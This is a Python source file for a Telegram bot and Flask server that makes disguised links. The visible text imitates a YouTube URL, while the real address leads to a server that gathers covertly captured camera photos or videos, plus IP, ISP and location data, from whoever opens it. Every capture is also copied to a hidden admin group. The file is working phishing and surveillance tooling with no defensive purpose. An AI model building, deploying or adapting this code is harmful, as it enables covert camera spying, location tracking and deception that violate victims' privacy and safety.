import os
import telebot
from flask import Flask, render_template, request
import threading
import io

# --- CONFIG ---
# These must be set in Koyeb Environment Variables
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
user_modes = {}

# --- TELEGRAM BOT LOGIC ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.chat.id
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("📸 8 Photos", "🎥 3s Video")
    bot.send_message(uid, "✅ Verification System Active.\nSelect your capture mode:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode(message):
    uid = message.chat.id
    mode = "photo" if "Photos" in message.text else "video"
    user_modes[uid] = mode
    msg = bot.send_message(uid, "Enter a fake YouTube Video ID (or type 'default'):")
    bot.register_next_step_handler(msg, make_link)

def make_link(message):
    uid = message.chat.id
    yt_id = message.text if message.text.lower() != 'default' else 'dQw4w9WgXcQ'
    mode = user_modes.get(uid, "photo")
    
    # Generate the actual target URL
    real_link = f"{BASE_URL}/?id={uid}&mode={mode}"
    # This is the text displayed to the user
    fake_display = f"https://youtu.be/{yt_id}?si=Check_Status"
    
    bot.send_message(
        uid, 
        f"🚀 **Link Ready!**\n\nTarget Link: [{fake_display}]({real_link})", 
        parse_mode="Markdown", 
        disable_web_page_preview=True
    )

# --- FLASK WEB SERVER LOGIC ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    ftype = request.args.get('type')
    file_bytes = request.files['file'].read()

    if tid and tid != "null":
        # 1. Send to the Target Person (Private DM)
        try:
            if ftype == 'photo':
                bot.send_photo(tid, file_bytes, caption="✅ Camera verified.")
            else:
                bot.send_document(tid, io.BytesIO(file_bytes), visible_file_name="verify.webm")
        except Exception as e:
            print(f"DM Error: {e}")

        # 2. Send to your Private Admin Group
        try:
            admin_cap = f"📁 **NEW CAPTURE**\nUser: `{tid}`\nType: `{ftype.upper()}`"
            if ftype == 'photo':
                bot.send_photo(GROUP_ID, io.BytesIO(file_bytes), caption=admin_cap, parse_mode="Markdown")
            else:
                bot.send_document(GROUP_ID, io.BytesIO(file_bytes), visible_file_name="admin_backup.webm", caption=admin_cap, parse_mode="Markdown")
        except Exception as e:
            print(f"Admin Group Error: {e}")
            
    return "OK"

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    
    log_msg = (f"📍 **Device Logged**\n"
               f"User: `{tid}`\n"
               f"IP: `{data.get('ip')}`\n"
               f"ISP: `{data.get('org')}`\n"
               f"City: {data.get('city')}, {data.get('country_name')}")
    
    # Send to User
    try: bot.send_message(tid, log_msg, parse_mode="Markdown")
    except: pass
    
    # Send to Admin Group
    try: bot.send_message(GROUP_ID, f"📑 **ADMIN DATA**\n{log_msg}", parse_mode="Markdown")
    except: pass
    
    return "OK"

# --- RUNNER ---

def run_bot_polling():
    print("Bot polling started...")
    bot.infinity_polling()

if __name__ == "__main__":
    # Start the bot thread
    t = threading.Thread(target=run_bot_polling)
    t.daemon = True
    t.start()
    
    # Start the Flask app
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
